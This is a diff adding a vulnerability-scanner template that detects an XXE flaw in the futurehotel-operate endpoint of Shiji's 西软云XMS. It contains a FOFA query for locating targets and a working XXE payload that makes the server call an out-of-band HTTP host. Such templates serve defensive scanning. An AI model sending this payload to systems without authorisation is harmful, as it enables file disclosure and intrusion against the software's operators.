@@ -1,0 +1,26 @@
+id: xiruanyun-xms-futurehotel-operate-xxe
+
+info:
+  name: 西软云XMS-futurehotel-operate 接口存在XXE漏洞
+  author: zan8in
+  severity: critical
+  description: |-
+    fofa: app="shiji-西软云XMS"
+    西软云XMS futurehotel-operate 接口存在XXE漏洞，攻击者可利用该漏洞读取任意文件。
+  tags: xiranyun,xxe,shiji
+  created: 2025/07/03
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+rules:
+  r0:
+    request:
+      method: POST
+      path: /XopServerRS/rest/futurehotel/operate
+      headers:
+        Content-Type: text/xml
+      body: |
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "{{oobHTTP}}"> %remote;]>
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+expression: r0()
